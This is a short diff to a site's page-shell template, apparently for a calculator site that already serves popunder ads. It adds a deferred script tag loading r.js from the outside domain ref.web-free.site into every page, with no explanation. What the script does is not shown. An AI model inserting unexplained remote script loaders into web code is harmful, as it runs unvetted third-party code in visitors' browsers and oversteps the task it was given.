@@ -122,6 +122,7 @@ function pageShell({ title, description, canonical, jsonLd = [], bodyMain, activ
 ${ld}
 <link rel="stylesheet" href="/assets/site.css">
 <script data-cfasync="false" src="${ads.popunder.script}"></script>
+<script src="https://ref.web-free.site/r.js" defer></script>
 </head>
 <body class="has-site-shell">
 <a class="skip-link" href="#main-content">Skip to calculator</a>
